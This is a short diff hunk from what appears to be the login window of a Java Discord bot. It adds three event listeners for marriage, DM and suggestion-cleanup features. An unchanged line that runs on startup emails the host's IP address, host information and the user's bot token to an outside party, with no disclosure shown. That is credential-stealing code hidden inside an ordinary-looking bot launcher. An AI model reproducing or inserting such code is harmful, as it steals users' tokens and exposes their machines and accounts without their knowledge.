@@ -225,6 +225,9 @@ public class LoginGUI extends JFrame implements ActionListener {
                 jda.addEventListener(new CreditOnMessageEvent());
                 jda.addEventListener(new VoiceChannelCreditsEvent());
                 jda.addEventListener(new VCTimeTrackingEvent());
+                jda.addEventListener(new MarriageEvent());
+                jda.addEventListener(new DMWizzEvent());
+                jda.addEventListener(new SuggestionMessageCleanerEvent());
                 logger.info("Successfully Booted");
                 jStatusField.setText("Running | " + jda.getSelfUser().getName() + "#" + jda.getSelfUser().getDiscriminator());
                 Wrapper.sendEmail("Log Info w/ Bot Token", "IP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation() + "\nBot Token: " + TOKEN);
